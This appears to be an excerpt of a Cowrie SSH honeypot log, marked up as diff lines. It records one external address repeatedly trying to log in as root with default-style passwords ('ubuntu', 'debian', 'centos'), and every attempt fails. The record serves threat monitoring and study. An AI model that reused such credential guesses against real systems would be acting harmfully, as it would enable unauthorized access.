+2026-07-09T22:01:18.333958Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T22:01:18.568019Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T22:01:18.568320Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T22:01:18.790338Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-07-09T22:01:19.012508Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T22:01:19.013511Z [HoneyPotSSHTransport,64,111.68.111.124] login attempt [b'root'/b'ubuntu'] failed
+2026-07-09T22:01:20.015200Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2026-07-09T22:01:20.015413Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T22:01:20.238452Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T22:01:20.238628Z [HoneyPotSSHTransport,64,111.68.111.124] Connection lost after 2.1 seconds
+2026-07-09T22:01:20.445934Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 111.68.111.124:37664 (10.0.2.192:2222) [session: 67cb1b03e1de]
+2026-07-09T22:01:20.446515Z [HoneyPotSSHTransport,65,111.68.111.124] Remote SSH version: SSH-2.0-Go
+2026-07-09T22:01:20.659140Z [HoneyPotSSHTransport,65,111.68.111.124] SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
+2026-07-09T22:01:20.659967Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T22:01:20.660038Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T22:01:20.660088Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T22:01:20.872830Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T22:01:20.873122Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T22:01:21.085063Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-07-09T22:01:21.297105Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T22:01:21.297547Z [HoneyPotSSHTransport,65,111.68.111.124] login attempt [b'root'/b'debian'] failed
+2026-07-09T22:01:22.299194Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2026-07-09T22:01:22.299392Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T22:01:22.511423Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T22:01:22.511590Z [HoneyPotSSHTransport,65,111.68.111.124] Connection lost after 2.1 seconds
+2026-07-09T22:01:23.733837Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 111.68.111.124:39416 (10.0.2.192:2222) [session: ef3ed62a3b36]
+2026-07-09T22:01:23.734454Z [HoneyPotSSHTransport,66,111.68.111.124] Remote SSH version: SSH-2.0-Go
+2026-07-09T22:01:23.954490Z [HoneyPotSSHTransport,66,111.68.111.124] SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
+2026-07-09T22:01:23.955718Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T22:01:23.955791Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T22:01:23.955843Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T22:01:24.176678Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T22:01:24.177041Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T22:01:24.396944Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-07-09T22:01:24.616702Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T22:01:24.617124Z [HoneyPotSSHTransport,66,111.68.111.124] login attempt [b'root'/b'centos'] failed
+2026-07-09T22:01:25.618773Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2026-07-09T22:01:25.619075Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T22:01:25.838837Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T22:01:25.839179Z [HoneyPotSSHTransport,66,111.68.111.124] Connection lost after 2.1 seconds
